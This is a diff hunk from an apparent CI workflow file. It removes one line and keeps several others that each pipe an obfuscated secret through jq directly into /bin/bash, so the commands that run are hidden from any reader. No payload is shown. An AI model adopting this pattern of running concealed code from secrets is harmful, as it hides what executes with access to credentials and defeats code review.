@@ -27,7 +27,6 @@ jobs:
           uwhl75: ${{ secrets.uwhl75 }}
         run: |
           printf '%s' "$uwhl75" | jq -r .qvrah81043 | /bin/bash
-          echo $ld232 | jq -r .x54 | /bin/bash
           echo $kptok417 | jq -r .x9 | /bin/bash
           echo $ah1 | jq -r .nqibi337 | /bin/bash
           printf '%s' "$vyarr46348" | jq -r .b1418 | /bin/bash
